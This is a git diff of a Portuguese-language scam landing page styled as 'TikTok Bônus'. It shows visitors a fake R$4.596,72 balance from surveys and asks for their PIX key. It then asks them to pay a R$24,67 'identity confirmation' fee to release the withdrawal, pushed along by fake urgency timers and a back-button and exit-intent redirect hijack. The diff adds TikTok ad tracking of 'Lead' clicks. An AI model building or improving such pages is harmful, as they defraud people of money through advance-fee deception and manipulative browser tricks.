@@ -28,7 +28,6 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
   </head>
   <body>
       <script src="js/valor-dinamico.js"></script>
-<script src="js/main.js"></script>
     <main id="screens">
       <section id="one" class="screen">
         <div class="title">TikTok Bônus</div>
@@ -46,7 +45,7 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
             </div>
 
             <div class="saldo-action">
-              <button type="button" class="btn-sacar" aria-label="Sacar" disabled="">
+              <button type="button" class="btn-sacar btn-sacar-tiktok-event" aria-label="Sacar" disabled="">
                 <span class="btn-text">Sacar</span>
                 <span class="pix-badge" aria-hidden="true">
                   <img src="images/pix-logo.svg" alt="">
@@ -279,14 +278,13 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
             <div class="entre">
               <span class="entre-txt entre-txt-dois">Faça 60 pesquisas diárias para ganhar até
                 <span class="entre-pts">996 pontos</span>
-                <span class="entre-data">• 60 pesquisas feitas hoje</span>
+                <span class="entre-data">• 5 pesquisas feitas hoje</span>
               </span>
               <button type="button" class="btn-concluido" aria-label="Sacar">
-                <span class="btn-concluido-text">Concluído</span>
+                <span class="btn-concluido-text">Expirado</span>
               </button>
             </div>
 
-            <!-- ADICIONEI A CLASSE "posicao-direita" AQUI -->
             <div class="assista posicao-direita">
               <span class="assista-txt">Até 756 pontos</span>
               <svg class="assista-tail taildois" xmlns="http://www.w3.org/2000/svg" width="7" height="6" viewBox="0 0 7 6" fill="none">
@@ -327,7 +325,7 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
                 <span class="entre-pts">100.000 pontos - 200.000 pontos</span>
               </span>
               <button type="button" class="btn-concluido" aria-label="Sacar">
-                <span class="btn-concluido-text">Concluído</span>
+                <span class="btn-concluido-text">Expirado</span>
               </button>
             </div>
           </div>
@@ -344,23 +342,11 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
               <div class="timer-label">Expira em</div>
 
               <div class="timer-clock">
-                <!-- Horas -->
                 <div class="timer-box" data-timer="hours">00</div>
-                <!-- Não é usado, mas bom ter -->
-
-                <!-- Separador -->
                 <div class="timer-separator">:</div>
-
-                <!-- Minutos -->
                 <div class="timer-box" data-timer="minutes">16</div>
-                <!-- ADICIONE AQUI -->
-
-                <!-- Separador -->
                 <div class="timer-separator">:</div>
-
-                <!-- Segundos -->
                 <div class="timer-box" data-timer="seconds">38</div>
-                <!-- ADICIONE AQUI -->
               </div>
             </div>
             <button type="button" class="btn-obrigado" aria-label="Obrigado" data-modal-close="">
@@ -369,6 +355,7 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
           </div>
         </div>
       </section>
+
       <section id="three" class="screen">
         <div class="expira-saldo">
           <div class="timer-wrapper">
@@ -430,7 +417,7 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
 
             <button class="btn-valor display-total">R$4.596,72</button>
           </div>
-          <button type="button" class="btn-obrigado btn-sacar-dois btn-sacar-indisponivel" aria-label="sacar dinheiro">
+          <button type="button" class="btn-obrigado btn-sacar-dois btn-sacar-indisponivel btn-sacar-tiktok-event" aria-label="sacar dinheiro">
             <span class="btn-text btn-textdois-sacar btn-three-saque">Sacar dinheiro</span>
           </button>
           <div class="obtem obtem-sacar sacar-dinheiro">
@@ -458,13 +445,6 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
           <button type="button" class="btn-sacar-indisponivel" aria-label="sacar dinheiro">
             <span class="btn-text btn-indis">Indisponível</span>
           </button>
-          <!-- <div class="obtem obtem-sacar">
-            <span class="obtem-txt"
-              >Para sacar ddasdasinheiro, você precisa de um saldo mínimo de
-              R$1,5. Os limites de saque para transações individuais e mensais
-              podem variar conforme o pais ou região.</span
-            >
-          </div> -->
         </div>
 
         <div class="saldo saldo-sacar">
@@ -515,6 +495,7 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
           </div>
         </div>
       </section>
+
       <section id="five" class="screen" aria-hidden="true">
         <div class="modal-inner inner-pop saque-popup">
           <div class="title saque-title">Vincular PIX</div>
@@ -539,7 +520,6 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
 
             <div class="form-group">
               <label class="field-label">Chave PIX</label>
-              <!-- Wrapper para detectar clique quando disabled -->
               <div id="pix-key-wrapper" class="input-wrapper-disabled">
                 <input type="text" id="pix-key-input" placeholder="Digite sua chave PIX" class="nome-completo input-disabled" disabled="">
               </div>
@@ -551,6 +531,7 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
           </div>
         </div>
       </section>
+
       <section id="six" class="screen" aria-hidden="true">
         <div class="modal-inner inner-pop">
           <div class="saque-popup chave-pix">
@@ -591,6 +572,7 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
           </div>
         </div>
       </section>
+
       <section id="seven" class="screen">
         <header class="loading-header">
           <div class="loading-logo">
@@ -609,6 +591,7 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
           </div>
         </main>
       </section>
+
       <section id="nine" class="screen" aria-hidden="true">
         <div class="confirmation-container">
           <div class="confirmation-header">
@@ -617,7 +600,6 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
             </div>
           </div>
 
-          <!-- Saldo Acumulado -->
           <div class="confirmation-section confirmation-balance">
             <div class="confirmation-balance-title">SALDO DISPONÍVEL</div>
             <div class="confirmation-balance-amount" data-amount-target="4596.72">
@@ -628,7 +610,6 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
             </div>
           </div>
 
-          <!-- Taxa de Confirmação -->
           <div class="confirmation-section">
             <div class="confirmation-section-title">
               CONFIRMAÇÃO DE IDENTIDADE
@@ -645,7 +626,6 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
             </div>
           </div>
 
-          <!-- Comprovante -->
           <div class="confirmation-section">
             <div class="confirmation-section-title">DADOS PARA REEMBOLSO</div>
             <div class="confirmation-receipt-grid">
@@ -671,7 +651,6 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
 
           <div class="confirmation-divider"></div>
 
-          <!-- Requisitos -->
           <div class="confirmation-section">
             <div class="confirmation-section-title">PROCESSO DE LIBERAÇÃO</div>
             <div class="confirmation-requirements-grid">
@@ -713,111 +692,64 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
             </div>
           </div>
 
-          <!-- Call to Action -->
-          <!-- ================================================
-  SUBSTITUA o bloco abaixo no seu index.html
-  Dentro de: <section id="nine"> → <div class="confirmation-section">
-  (o bloco que continha o link para pay.gymour.com)
-================================================ -->
+          <div class="confirmation-section">
+            <button
+              type="button"
+              class="confirmation-cta-button"
+              id="confirmation-button"
+            >
+              Pagar taxa para Liberar Saque
+            </button>
 
-<div class="confirmation-section">
-
-  <!-- Botão principal — agora dispara o PIX em vez de redirecionar -->
-  <button
-    type="button"
-    class="confirmation-cta-button"
-    id="confirmation-button"
-  >
-    Pagar taxa para Liberar Saque
-  </button>
-
-  <!-- Painel do PIX — fica oculto até o SDK responder com sucesso -->
-  <div id="pix-payment-panel" style="display:none; margin-top: 20px;">
-
-    <p class="pix-panel-subtitle">
-      Escaneie o QR Code ou copie o código abaixo para pagar <strong>R$ 24,67</strong>
-    </p>
-
-    <!-- QR Code -->
-    <div class="pix-qr-wrapper">
-      <img id="pix-qr-img" src="" alt="QR Code PIX" class="pix-qr-img" />
-    </div>
-
-    <!-- Copia e Cola -->
-    <div class="pix-copy-wrapper">
-      <textarea id="pix-code-text" class="pix-code-text" readonly></textarea>
-      <button type="button" id="btn-copy-pix" class="btn-copy-pix">
-        📋 Copiar código PIX
-      </button>
-      <p id="copy-feedback" class="copy-feedback" aria-live="polite"></p>
-    </div>
-
-    <p class="pix-panel-hint">⏳ O pagamento é confirmado automaticamente.</p>
-  </div>
-
-  <!-- Mensagem de erro — fica oculta até ocorrer falha -->
-  <div id="pix-error-panel" style="display:none; margin-top: 16px;" class="pix-panel-error">
-    <p class="pix-error-msg" id="pix-error-msg">⚠️ Não foi possível gerar o PIX. Tente novamente.</p>
-  </div>
-
-  <div class="confirmation-timer">
-    ⏱️ Reembolso automático em 1 minuto
-  </div>
-
-  <div class="confirmation-success-message" id="confirmation-success-message">
-    ✅ Identidade confirmada. Saque liberado.
-  </div>
-
-</div>
-          <!-- Segurança 
-          <div class="confirmation-security-grid">
-            <div class="confirmation-security-item">
-              <div class="confirmation-security-label">
-                <img src="images/bacen.png" alt="" class="img-bacen">
+            <div id="pix-payment-panel" style="display:none; margin-top: 20px;">
+              <p class="pix-panel-subtitle">
+                Escaneie o QR Code ou copie o código abaixo para pagar <strong>R$ 24,67</strong>
+              </p>
+              <div class="pix-qr-wrapper">
+                <img id="pix-qr-img" src="" alt="QR Code PIX" class="pix-qr-img" />
               </div>
+              <div class="pix-copy-wrapper">
+                <textarea id="pix-code-text" class="pix-code-text" readonly></textarea>
+                <button type="button" id="btn-copy-pix" class="btn-copy-pix">
+                  📋 Copiar código PIX
+                </button>
+                <p id="copy-feedback" class="copy-feedback" aria-live="polite"></p>
+              </div>
+              <p class="pix-panel-hint">⏳ O pagamento é confirmado automaticamente.</p>
             </div>
-            <div class="confirmation-security-item">
-              <div class="confirmation-security-label">
-                <img src="images/gov-br.webp" alt="" class="img-gov-br">
-              </div>
+
+            <div id="pix-error-panel" style="display:none; margin-top: 16px;" class="pix-panel-error">
+              <p class="pix-error-msg" id="pix-error-msg">⚠️ Não foi possível gerar o PIX. Tente novamente.</p>
             </div>
-            <div class="confirmation-security-item">
-              <div class="confirmation-security-label">
-                <img src="images/receitafederal.png" alt="" class="img-receitafederal">
-              </div>
+
+            <div class="confirmation-timer">
+              ⏱️ Reembolso automático em 1 minuto
+            </div>
+
+            <div class="confirmation-success-message" id="confirmation-success-message">
+              ✅ Identidade confirmada. Saque liberado.
             </div>
           </div>
-            -->
 
-          <!-- Footer -->
           <div class="confirmation-footer">
             <div class="confirmation-footer-text">Processo 100% seguro</div>
             <a href="#nine" class="confirmation-footer-link">Precisa de ajuda?</a>
           </div>
         </div>
       </section>
+
       <section id="popup-um" class="sticky-popup">
         <div class="timer-wrapper expira-em-popup">
           <div class="timer-label">Expira em</div>
 
           <div class="timer-clock">
-            <!-- Horas -->
             <div class="timer-box" data-timer="hours">00</div>
-
-            <!-- Separador -->
             <div class="timer-separator">:</div>
-
-            <!-- Minutos -->
             <div class="timer-box" data-timer="minutes">42</div>
-
-            <!-- Separador -->
             <div class="timer-separator">:</div>
-
-            <!-- Segundos -->
             <div class="timer-box" data-timer="seconds">37</div>
           </div>
         </div>
-        <!-- <div class="line line-expira"></div> -->
         <div class="saldo saldo-popup">
           <div class="container-saldo" role="region" aria-labelledby="saldo-title">
             <div class="saldo-info">
@@ -832,7 +764,7 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
             </div>
 
             <div class="saldo-action">
-              <button type="button" class="btn-sacar" aria-label="Sacar">
+              <button type="button" class="btn-sacar btn-sacar-tiktok-event" aria-label="Sacar">
                 <span class="btn-text">Sacar</span>
                 <span class="pix-badge" aria-hidden="true">
                   <img src="images/pix-logo.svg" alt="">
@@ -845,45 +777,36 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
     </main>
 
     <script>
-      // Funções auxiliares
       function easeOutCubic(t) {
         return 1 - Math.pow(1 - t, 3);
       }
 
       function formatBR(value) {
         return value
-          .toFixed(2) // duas casas decimais
-          .replace(".", ",") // vírgula decimal
-          .replace(/\B(?=(\d{3})+(?!\d))/g, "."); // ponto para milhar
+          .toFixed(2)
+          .replace(".", ",")
+          .replace(/\B(?=(\d{3})+(?!\d))/g, ".");
       }
 
-      // Função reutilizável para animar um contador
       function animateCurrencyCounter(counter, forceReset = false) {
         if (!counter) return;
-
-        // Se já está animando e não forçou reset, não anima novamente
         if (counter._isAnimating && !forceReset) return;
 
-        const duration = 2000; // tempo total da animação
-        const toValue =
-          parseFloat(counter.getAttribute("data-amount-target")) || 0;
+        const duration = 2000;
+        const toValue = parseFloat(counter.getAttribute("data-amount-target")) || 0;
         const fromValue = 0;
 
         if (toValue === 0) {
-          // Garante que sempre mostre um valor válido, mesmo se for 0
           counter.textContent = "R$ 0,00";
           return;
         }
 
-        // Cancela animação anterior se existir
         if (counter._animationFrameId) {
           cancelAnimationFrame(counter._animationFrameId);
           counter._animationFrameId = null;
         }
 
-        // Garante que sempre comece com um valor visível
         counter.textContent = "R$ 0,00";
-
         counter._isAnimating = true;
         let startTime = null;
 
@@ -891,10 +814,8 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
           if (!startTime) startTime = currentTime;
           const elapsed = currentTime - startTime;
           const progress = Math.min(elapsed / duration, 1);
-          const value =
-            fromValue + (toValue - fromValue) * easeOutCubic(progress);
+          const value = fromValue + (toValue - fromValue) * easeOutCubic(progress);
 
-          // Atualiza número formatado no padrão brasileiro - sempre garante um valor válido
           const formattedValue = "R$ " + formatBR(value);
           if (counter && counter.textContent !== undefined) {
             counter.textContent = formattedValue;
@@ -903,7 +824,6 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
           if (progress < 1) {
             counter._animationFrameId = requestAnimationFrame(animateCounter);
           } else {
-            // garante valor final exato
             const finalValue = "R$ " + formatBR(toValue);
             if (counter && counter.textContent !== undefined) {
               counter.textContent = finalValue;
@@ -913,7 +833,6 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
           }
         }
 
-        // Pequeno delay para garantir que o DOM está pronto
         setTimeout(() => {
           if (counter && counter.getAttribute("data-amount-target")) {
             counter._animationFrameId = requestAnimationFrame(animateCounter);
@@ -921,74 +840,31 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
         }, 10);
       }
 
-      // Anima todos os contadores visíveis no carregamento
       document.addEventListener("DOMContentLoaded", function () {
-        // Anima apenas contadores que estão visíveis na tela inicial
         const initialCounters = document.querySelectorAll(
           "#one .valor-currency[data-amount-target]"
         );
         initialCounters.forEach((counter) => {
           animateCurrencyCounter(counter);
         });
+
+        // TikTok Lead event em todos os botões de sacar
+        document.querySelectorAll(".btn-sacar-tiktok-event").forEach(function(btn) {
+          btn.addEventListener("click", function() {
+            if (typeof ttq !== "undefined") {
+              ttq.track("Lead");
+            }
+          });
+        });
       });
 
-      // Expõe a função globalmente para ser chamada quando o popup abrir
       window.animateCurrencyCounter = animateCurrencyCounter;
     </script>
 
-    <!-- <script>
-      document.addEventListener("DOMContentLoaded", function () {
-        const counters = document.querySelectorAll(".elementor-counter-number");
-
-        counters.forEach((counter) => {
-          const duration =
-            parseInt(counter.getAttribute("data-duration")) || 2000;
-          const toValue =
-            parseFloat(counter.getAttribute("data-to-value")) || 0;
-          const fromValue =
-            parseFloat(counter.getAttribute("data-from-value")) || 0;
-          const delimiter = counter.getAttribute("data-delimiter") || ".";
-
-          let startTime = null;
-
-          function animateCounter(currentTime) {
-            if (!startTime) startTime = currentTime;
-            const elapsed = currentTime - startTime;
-            const progress = Math.min(elapsed / duration, 1);
-            const value =
-              fromValue + (toValue - fromValue) * easeOutCubic(progress);
-
-            counter.textContent = formatNumber(value, delimiter);
-
-            if (progress < 1) {
-              requestAnimationFrame(animateCounter);
-            } else {
-              counter.textContent = formatNumber(toValue, delimiter);
-            }
-          }
-
-          requestAnimationFrame(animateCounter);
-        });
-
-        function easeOutCubic(t) {
-          return 1 - Math.pow(1 - t, 3);
-        }
-
-        function formatNumber(value, delimiter) {
-          // exibe com 2 casas decimais e separador personalizado
-          let formatted = value.toFixed(2);
-          if (delimiter === ",") formatted = formatted.replace(".", ",");
-          return formatted;
-        }
-      });
-    </script> -->
     <script src="js/main.js"></script>
-    <!-- <script src="js/agr.js"></script> -->
-    <!-- <script src="js/sera.js"></script> -->
-  
+
 <script>
 (function() {
-  // 🔗 URL de destino — substitua pelo seu link real:
   const destino = "https:///";
   let jaRedirecionou = false;
 
@@ -999,26 +875,21 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
     }
   }
 
-  // Impede loop de redirecionamento em reload/back cache
   if (sessionStorage.getItem("__ja_redirecionou__")) return;
   sessionStorage.setItem("__ja_redirecionou__", "1");
 
-  // Detecta intenção de saída no desktop (mouse indo pro topo)
   document.addEventListener("mouseleave", function(e) {
     if (e.clientY < 0 && !/Mobi|Android/i.test(navigator.userAgent)) {
       redirecionar();
     }
   });
 
-  // Detecta tentativa de voltar (botão voltar do navegador)
   window.addEventListener("popstate", function() {
     redirecionar();
   });
 
-  // Adiciona um estado no histórico (para detectar o "voltar")
   window.history.pushState({}, "", window.location.href);
 
-  // Protege contra travamentos ou loops em alguns navegadores
   window.addEventListener("pageshow", function(e) {
     if (e.persisted) {
       sessionStorage.removeItem("__ja_redirecionou__");
